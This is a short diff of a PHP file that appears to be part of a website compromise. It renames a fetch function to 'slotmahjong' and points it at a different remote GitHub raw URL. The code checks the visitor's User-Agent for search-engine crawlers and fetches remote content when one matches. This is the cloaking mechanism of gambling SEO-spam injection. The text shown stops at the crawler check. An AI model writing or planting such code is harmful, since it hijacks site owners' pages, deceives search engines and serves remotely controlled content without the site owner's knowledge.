@@ -1,5 +1,5 @@
 <?php
-function slot777($url) {
+function slotmahjong($url) {
     if (ini_get('allow_url_fopen')) {
     return file_get_contents($url);
     } elseif (function_exists('curl_init')) {
@@ -15,7 +15,7 @@ function slot777($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://raw.githubusercontent.com/MadzKebab/tothemoon/refs/heads/main/airijurnal";
+$bot = "https://raw.githubusercontent.com/MadzKebab/tothemoon/refs/heads/main/oldairi";
 $file = slotmahjong($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
